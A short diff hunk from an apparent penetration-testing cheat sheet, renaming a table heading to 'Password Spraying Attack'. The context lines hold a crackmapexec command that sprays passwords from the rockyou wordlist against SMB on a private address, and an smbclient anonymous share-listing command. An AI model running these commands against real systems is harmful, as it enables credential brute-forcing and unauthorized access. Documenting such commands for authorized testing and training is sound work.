@@ -63,7 +63,7 @@
 
 
 
-|  password spray   |
+|  Password Spraying Attack |
 | ------------- |
 | crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
 | smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
